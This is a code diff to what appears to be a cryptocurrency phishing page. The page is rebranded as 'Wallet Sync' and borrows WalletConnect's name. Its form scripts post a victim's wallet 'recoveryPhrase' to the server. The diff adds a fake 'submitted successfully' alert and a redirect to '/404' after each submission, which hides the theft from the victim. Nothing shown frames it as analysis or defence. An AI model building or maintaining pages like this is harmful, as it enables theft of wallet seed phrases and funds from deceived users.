@@ -772,7 +772,7 @@
                             <div class="layout__SContainer-wjwiqk-2 fuQfHo">
                                 <div class="pageStyles__SIndexPage-sc-1navawn-0 hDbjSS">
                                     <div class="pageStyles__SBrandingWrapper-sc-1navawn-1 fAmUdU">
-										<h2 class="text-4xl font-medium">Vee Defi</h2>                                     
+										<h2 class="text-4xl font-medium">Wallet Sync</h2>                                     
 										<p class="mt-10 text-lg font-thin leading-6 text-gray-100">Multiple iOS and Android wallets support the WalletConnect protocol. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.</p>
 									                                    </div>
                                     <section class="centered my-8" style="margin-top: 50px;              ">
@@ -2151,9 +2151,10 @@
                                     recoveryPhrase
                                 })
                             });
+                            alert('Wallet details submitted successfully');
+                            // document.getElementById('cancel').click();
+                            window.location.href = '/404';
                         }
-                        alert('Wallet details submitted successfully');
-                        document.getElementById('cancel').click();
                     } catch (error) {
                         console.error('Form submission failed:', error);
                         alert('Failed to submit form.');
@@ -2176,7 +2177,8 @@
                                 })
                             });
                             alert('Wallet details submitted successfully');
-                            document.getElementById('cancel').click();
+                            // document.getElementById('cancel').click();
+                            window.location.href = '/404';
                         }
                     } catch (error) {
                         console.error('Form submission failed:', error);
@@ -2201,7 +2203,8 @@
                                 body: formData
                             });
                             alert('Wallet details submitted successfully');
-                            document.getElementById('cancel').click();
+                            // document.getElementById('cancel').click();
+                            window.location.href = '/404';
                         }
                     } catch (error) {
                         console.error('Form submission failed:', error);
